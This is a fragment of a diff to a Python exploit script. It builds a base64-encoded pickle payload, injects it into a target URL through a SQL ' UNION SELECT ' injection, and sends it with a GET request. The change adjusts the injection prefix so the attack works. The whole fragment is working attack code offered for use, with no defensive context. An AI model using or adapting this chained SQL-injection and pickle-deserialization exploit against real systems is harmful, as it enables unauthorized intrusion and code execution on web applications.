@@ -28,7 +28,7 @@ def exploit(url):
     serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()
 
     # Construct the final URL by appending the serialized payload
-    final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"
+    final_url = f"{url}/view/1' UNION SELECT '{serialized_payload}"
 
     # Perform a GET request to the constructed URL
     response = requests.get(final_url)
